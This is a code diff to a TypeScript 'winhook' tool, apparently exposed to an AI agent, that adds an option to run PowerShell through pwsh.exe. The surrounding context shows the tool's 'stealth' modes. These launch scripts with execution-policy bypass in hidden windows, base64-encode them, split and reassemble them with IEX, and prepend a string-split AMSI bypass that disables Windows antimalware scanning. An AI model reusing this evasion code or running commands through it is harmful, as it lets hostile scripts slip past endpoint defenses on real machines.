@@ -506,6 +506,7 @@ type HookResult = { output: string; findings: Finding[] }
 
 type StealthMode = "base64" | "amsi" | "obfuscate"
 let activeStealth: StealthMode | undefined
+let usePwsh = false
 
 // ── CLI helpers ──
 
@@ -536,14 +537,14 @@ function ps(script: string, timeout: number, stealth?: StealthMode) {
   const mode = stealth || activeStealth
   if (!mode) {
     return run(
-      "powershell.exe",
+      usePwsh ? "pwsh.exe" : "powershell.exe",
       ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script],
       timeout,
     )
   }
   if (mode === "base64") {
     return run(
-      "powershell.exe",
+      usePwsh ? "pwsh.exe" : "powershell.exe",
       ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", toBase64(script)],
       timeout,
     )
@@ -551,7 +552,7 @@ function ps(script: string, timeout: number, stealth?: StealthMode) {
   if (mode === "amsi") {
     const patch = `$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');$f.SetValue($null,$true);`
     return run(
-      "powershell.exe",
+      usePwsh ? "pwsh.exe" : "powershell.exe",
       ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", toBase64(patch + script)],
       timeout,
     )
@@ -561,7 +562,7 @@ function ps(script: string, timeout: number, stealth?: StealthMode) {
   const concat = chunks.map((_, i) => `$z${i}`).join("+")
   const wrapped = `${vars};IEX(${concat})`
   return run(
-    "powershell.exe",
+    usePwsh ? "pwsh.exe" : "powershell.exe",
     ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", toBase64(wrapped)],
     timeout,
   )
@@ -17452,11 +17453,13 @@ export const WinhookTool = Tool.define("winhook", {
     }
 
     activeStealth = argVal(params.args, "--stealth") as StealthMode | undefined
+    usePwsh = hasFlag(params.args, "--pwsh")
 
     const program = params.program as Program
     const handler = dispatch[program]
     const result = await handler(params.args, params.timeout_seconds)
     activeStealth = undefined
+    usePwsh = false
 
     return {
       title: `winhook: ${program}`,
